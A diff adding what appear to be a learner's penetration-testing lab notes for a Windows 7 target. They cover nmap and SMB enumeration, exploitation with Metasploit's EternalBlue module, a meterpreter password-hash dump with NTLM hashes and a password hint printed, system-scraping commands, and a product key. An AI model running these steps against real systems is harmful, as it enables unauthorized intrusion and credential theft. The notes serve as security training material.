@@ -1,0 +1,160 @@
+    1- Enumeration:
+        nmap -T5 -Pn -sC -sV 10.10.201.3 -oN enum/sanLogs1.logs  -vv
+            Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-24 21:02 EST
+            
+                PORT      STATE SERVICE            REASON  VERSION
+                135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
+                139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
+                445/tcp   open  microsoft-ds       syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+                3389/tcp  open  ssl/ms-wbt-server? syn-ack
+                | ssl-cert: Subject: commonName=TCM-PC
+                | ....
+                5357/tcp  open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+                    |_http-title: Service Unavailable
+                    |_http-server-header: Microsoft-HTTPAPI/2.0
+                    49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
+                    49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
+                    49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
+                    49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
+                    49161/tcp open  msrpc              syn-ack Microsoft Windows RPC
+                    Service Info: Host: TCM-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+                Host script results:
+                | smb2-security-mode: 
+                |   2:1:0: 
+                |_    Message signing enabled but not required
+                | smb-security-mode: 
+                |   account_used: guest
+                |   authentication_level: user
+                |   challenge_response: supported
+                |_  message_signing: disabled (dangerous, but default)
+                |_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s
+                | nbstat: NetBIOS name: TCM-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:0c:8e:09:61:31 (unknown)
+                | Names:
+    ------------>   TCM-PC<00>           Flags: <unique><active>
+                |   WORKGROUP<00>        Flags: <group><active>
+                |   TCM-PC<20>           Flags: <unique><active>
+                |   WORKGROUP<1e>        Flags: <group><active>
+                |   WORKGROUP<1d>        Flags: <unique><active>
+                |   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+                | Statistics:
+                |   02:0c:8e:09:61:31:00:00:00:00:00:00:00:00:00:00:00
+                |   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+                |_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+                | smb-os-discovery: 
+    ------------>   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+                |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+                |   Computer name: TCM-PC
+                |   NetBIOS computer name: TCM-PC\x00
+                |   Workgroup: WORKGROUP\x00
+                |_  System time: 2024-01-24T21:04:18-05:00
+                | p2p-conficker: 
+                |   Checking for Conficker.C or higher...
+                |   Check 1 (port 18733/tcp): CLEAN (Couldn't connect)
+                |   Check 2 (port 36578/tcp): CLEAN (Couldn't connect)
+                |   Check 3 (port 24597/udp): CLEAN (Timeout)
+                |   Check 4 (port 52175/udp): CLEAN (Failed to receive data)
+                |_  0/4 checks are positive: Host is CLEAN or ports are blocked
+                | smb2-time: 
+                |   date: 2024-01-25T02:04:18
+                |_  start_date: 2024-01-25T02:01:21
+    Port 445:
+        └─$ crackmapexec smb 10.10.201.3 -u'a' -p"
+            dquote> "
+            SMB         10.10.201.3     445    TCM-PC           [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:TCM-PC) (domain:TCM-PC) (signing:False) (SMBv1:True)
+
+    Port 135:
+        rpcinfo -p 10.10.201.3
+            10.10.201.3: RPC: Remote system error - Connection refused
+
+    Based on the Windows Version we will try Ethernal Blue:
+        Exploiting ms17–010 using Metasploit
+            -https://medium.com/@rakshan793/blue-walkthrough-hack-the-box-7d5a87db5dbe
+        
+        use exploit/windows/smb/ms17_010_eternalblue
+        
+
+        It works we have a meterpreter shell
+
+    Harvest credentials meterpreter:
+    -https://www.coengoedegebure.com/hacking-windows-with-meterpreter/
+
+        meterpreter > run post/windows/gather/hashdump
+
+        [*] Obtaining the boot key...
+        [*] Calculating the hboot key using SYSKEY f84cc9ef701ecf160296222e4d21286e...
+        [*] Obtaining the user list and keys...
+        [*] Decrypting user keys...
+        [*] Dumping password hints...
+
+        TCM:"Super secure password"
+
+        [*] Dumping password hashes...
+
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        TCM:1001:aad3b435b51404eeaad3b435b51404ee:9075168608b7aba2428c8387bfeb9aee:::
+        HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:87d8f24dad52ed0401ec399facbca46c:::
+        user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
+
+
+    Screen Capture:
+        meterpreter > execute -f calc.exe
+        Process 3020 created.
+        meterpreter > screenshot
+
+    Scrape the system:
+        Scrape the system
+
+            Running Command List ...
+                [*]     running command cmd.exe /c set
+                [*]     running command arp -a
+                [*]     running command ipconfig /all
+                [*]     running command ipconfig /displaydns
+                [*]     running command route print
+                [*]     running command net view
+                [*]     running command netstat -nao
+                [*]     running command netstat -vb
+                [*]     running command netstat -ns
+                [*]     running command net accounts
+                [*]     running command net session
+                [*]     running command net share
+                [*]     running command net localgroup administrators
+                [*]     running command net group
+                [*]     running command net user
+                [*]     running command netsh firewall show config
+                [*]     running command net group administrators
+                [*]     running command tasklist /svc
+                [*]     running command net view /domain
+                [*]     running command net localgroup
+                [*]     running command netsh wlan show profiles
+                [*]     running command gpresult /SCOPE USER /Z
+                [*]     running command gpresult /SCOPE COMPUTER /Z
+                [*]     running command netsh wlan show drivers
+                [*]     running command netsh wlan show interfaces
+                [*]     running command netsh wlan show networks mode=bssid
+                [*] Running WMIC Commands ....
+                [*]     running command wmic useraccount list
+                [*]     running command wmic service list brief
+                [*]     running command wmic group list
+                [*]     running command wmic volume list brief
+                [*]     running command wmic netlogin get name,lastlogon,badpasswordcount
+                [*]     running command wmic netuse get name,username,connectiontype,localname
+                [*]     running command wmic netclient list brief
+                [*]     running command wmic nteventlog get path,filename,writeable
+                [*]     running command wmic share get name,path
+                [*]     running command wmic logicaldisk get description,filesystem,name,size
+                [*]     running command wmic rdtoggle list
+                [*]     running command wmic qfe
+                [*]     running command wmic startup list full
+                [*]     running command wmic product get name,version
+                [*] Extracting software list from registry
+                [*] Dumping password hashes...
+                [*] Hashes Dumped
+                [*] Getting Tokens...
+
+
+
+    key.txt:
+        KKQFK-89TGP-J4W4X-3XPCG-CQRYW
+                                                                            
